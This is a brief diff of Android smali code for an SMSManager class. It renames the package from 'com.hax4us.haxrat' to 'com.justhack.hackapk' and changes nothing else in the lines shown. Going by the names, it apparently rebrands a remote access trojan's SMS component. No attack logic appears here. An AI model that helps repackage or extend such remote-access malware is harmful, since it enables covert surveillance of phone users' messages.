@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/SMSManager;
+.class public Lcom/justhack/hackapk/SMSManager;
 .super Ljava/lang/Object;
 .source "SMSManager.java"
 
@@ -73,7 +73,7 @@
     move-object v3, v12
 
     .line 24
-    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/justhack/hackapk/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v12
 
